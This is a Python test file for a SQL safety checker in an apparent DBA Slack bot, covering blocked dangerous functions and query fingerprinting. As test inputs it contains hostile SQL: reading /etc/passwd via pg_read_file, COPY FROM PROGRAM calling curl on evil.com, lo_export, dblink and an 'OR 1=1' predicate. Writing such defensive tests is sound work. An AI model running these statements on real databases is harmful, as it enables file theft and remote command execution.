"""ast_safety — sqlglot second-pass checks + the approval-cache fingerprint."""
from dba_slack_bot import ast_safety as ast


# --- dangerous function / COPY PROGRAM / pg_sleep --------------------------

def test_clean_select_passes():
    assert ast.check("SELECT id FROM users WHERE id = 1") == []


def test_pg_read_file_blocked():
    assert ast.check("SELECT pg_read_file('/etc/passwd')")


def test_lo_export_blocked():
    assert ast.check("SELECT lo_export(1, '/tmp/x')")


def test_dblink_blocked():
    assert ast.check("SELECT dblink('host=x', 'SELECT 1')")


def test_copy_program_blocked():
    assert ast.check("COPY t FROM PROGRAM 'curl evil.com'")


def test_long_pg_sleep_blocked():
    assert ast.check("SELECT pg_sleep(3600)")


def test_short_pg_sleep_ok():
    assert ast.check("SELECT pg_sleep(1)") == []


def test_unparseable_blocked():
    # Obfuscation / malformed SQL fails closed.
    assert ast.check("SELECT * FROM WHERE )(")


# --- is_explainable ---------------------------------------------------------

def test_explainable_select():
    from dba_slack_bot import pre_flight as pf
    assert pf.is_explainable("SELECT 1")
    assert pf.is_explainable("UPDATE t SET a=1 WHERE id=1")
    assert pf.is_explainable("WITH c AS (SELECT 1) SELECT * FROM c")


def test_not_explainable_ddl():
    from dba_slack_bot import pre_flight as pf
    assert not pf.is_explainable("ALTER TABLE t ADD COLUMN x int")
    assert not pf.is_explainable("CREATE TABLE t (id int)")
    assert not pf.is_explainable("TRUNCATE t")


# --- fingerprint: literal-agnostic, structure-sensitive --------------------

def fp(sql):
    return ast.fingerprint(sql)


def test_fingerprint_same_for_different_literals():
    assert fp("SELECT * FROM users WHERE id = 1") == \
           fp("SELECT * FROM users WHERE id = 2")


def test_fingerprint_same_for_string_literal_change():
    assert fp("SELECT name FROM u WHERE city = 'Istanbul'") == \
           fp("SELECT name FROM u WHERE city = 'Ankara'")


def test_fingerprint_differs_on_added_predicate():
    assert fp("SELECT * FROM users WHERE id = 1") != \
           fp("SELECT * FROM users WHERE id = 1 OR 1=1")


def test_fingerprint_differs_on_different_column():
    assert fp("SELECT a FROM t WHERE id = 1") != \
           fp("SELECT b FROM t WHERE id = 1")


def test_fingerprint_differs_on_in_list_length():
    # Each literal becomes a placeholder, so list length still changes shape.
    assert fp("SELECT * FROM t WHERE id IN (1,2,3)") != \
           fp("SELECT * FROM t WHERE id IN (1,2,3,4)")


def test_fingerprint_none_for_unparseable():
    assert fp("SELECT FROM WHERE =") is None


def test_fingerprint_none_for_empty():
    assert fp("") is None
    assert fp("   ") is None
